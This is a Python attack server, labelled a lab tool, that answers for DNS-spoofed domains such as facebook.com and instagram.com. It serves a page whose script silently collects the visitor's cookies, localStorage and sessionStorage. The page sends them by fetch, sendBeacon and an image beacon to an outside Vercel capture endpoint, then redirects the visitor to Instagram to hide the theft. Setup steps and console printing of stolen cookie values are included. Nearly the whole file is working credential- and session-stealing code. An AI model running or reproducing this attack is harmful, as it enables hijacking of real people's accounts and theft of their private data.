"""
Lab server - Run on attacker machine.
Serves a capture page for DNS-spoofed domains.
No modification needed on target machines.
"""

import http.server
import json
import socket

HOST = "0.0.0.0"
PORT = 80
API_URL = "https://lolz-a0y51apf8-armis-projects.vercel.app/api/capture"

# Domains you've set up in router DNS
SPOOFED_DOMAINS = ["facebook.com", "instagram.com", "fb.com"]

HTML = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Loading...</title><style>
body{background:#fff;color:#333;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;text-align:center}
</style></head><body>
<h2>Please wait...</h2>
<script>
(async function() {
  const domain = window.location.hostname;
  const t0 = performance.now();

  // Read ALL cookies for this domain
  const rawCookies = document.cookie || '';

  // Parse cookies into structured format
  const parsedCookies = rawCookies ? rawCookies.split(';').map(c => {
    const parts = c.trim().split('=');
    return { name: parts[0], value: parts.slice(1).join('=') };
  }) : [];

  // Read ALL localStorage keys for this domain
  let ls = {};
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      ls[k] = localStorage.getItem(k);
    }
  } catch(e) { ls = { error: e.message }; }

  // Read sessionStorage
  let ss = {};
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const k = sessionStorage.key(i);
      ss[k] = sessionStorage.getItem(k);
    }
  } catch(e) { ss = { error: e.message }; }

  // IndexedDB databases (names only)
  let dbs = [];
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const est = await navigator.storage.estimate();
      dbs.push({ quota: est.quota, usage: est.usage });
    }
  } catch(e) {}

  const data = {
    timestamp: new Date().toISOString(),
    spoofedDomain: domain,
    url: window.location.href,
    referrer: document.referrer || 'direct',
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    cookies: { raw: rawCookies || 'none', parsed: parsedCookies, count: parsedCookies.length },
    localStorage: ls,
    sessionStorage: ss,
    cookiesEnabled: navigator.cookieEnabled,
    loadTime: Math.round(performance.now() - t0) + 'ms'
  };

  // Send to Vercel API via multiple methods to ensure delivery
  let sent = false;

  // Method 1: fetch
  try {
    const r = await fetch('""" + API_URL + """', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    sent = r.ok;
  } catch(e) {}

  // Method 2: sendBeacon (works even during page unload)
  if (!sent) {
    try {
      navigator.sendBeacon('""" + API_URL + """', JSON.stringify(data));
    } catch(e) {}
  }

  // Method 3: Image beacon as fallback
  try {
    new Image().src = '""" + API_URL.replace('/api/capture', '/api/beacon') + """?d=' + encodeURIComponent(JSON.stringify(data));
  } catch(e) {}

  // Show nothing suspicious
  document.body.innerHTML = '<h2 style="color:#888;font-size:1rem">Redirecting...</h2>';
  setTimeout(() => { window.location.href = 'https://www.instagram.com/'; }, 100);
})();
</script>
</body></html>
"""

# Also serve a beacon endpoint for GET-based fallback
BEACON_HTML = """<!DOCTYPE html><html><body><script>
  const d = decodeURIComponent(location.search.replace('?d=', ''));
  if (d) {
    try {
      navigator.sendBeacon('""" + API_URL + """', d);
    } catch(e) {}
  }
</script></body></html>"""

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/beacon'):
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(BEACON_HTML.encode())
            return
        if self.path.startswith('/api/'):
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())
            return
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML.encode())

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length) if length else b'{}'
        try:
            data = json.loads(body)
            domain = data.get('spoofedDomain', '?')
            cookies = data.get('cookies', {})
            count = cookies.get('count', 0) if isinstance(cookies, dict) else 0
            ls = data.get('localStorage', {})
            lsc = len(ls) if isinstance(ls, dict) else 0
            print(f"\n[+] CAPTURED: {domain}")
            print(f"    Cookies: {count}")
            print(f"    localStorage keys: {lsc}")
            if count > 0:
                for c in cookies.get('parsed', []):
                    name = c.get('name', '')
                    val = c.get('value', '')[:60]
                    print(f"      COOKIE: {name} = {val}...")
            if lsc > 0:
                for k, v in list(ls.items())[:5]:
                    print(f"      LS: {k} = {str(v)[:60]}...")
        except Exception as e:
            print(f"[-] Parse error: {e}")
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())

    def log_message(self, fmt, *args):
        pass  # quiet

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('1.1.1.1', 1))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    s.close()
    return ip

if __name__ == "__main__":
    print("=" * 60)
    print("  CAPTURE LAB - DNS Spoof Server")
    print("=" * 60)
    my_ip = get_ip()
    print(f"\n  Your IP: {my_ip}")
    print(f"\n  STEP 1: Configure your router DNS:")
    for d in SPOOFED_DOMAINS:
        print(f"    {d:20} -> {my_ip}")
    print(f"\n  STEP 2: Run this server (as Admin on Windows):")
    print(f"    python server.py")
    print(f"\n  STEP 3: Target visits http://facebook.com/")
    print(f"    Cookies + localStorage get captured silently")
    print(f"\n  Press Ctrl+C to stop\n")
    print("-" * 60)

    try:
        server = http.server.HTTPServer((HOST, PORT), Handler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[+] Stopped")
        server.shutdown()
    except PermissionError:
        print(f"\n[-] Need admin rights for port {PORT}")
        print(f"    Run as Administrator")
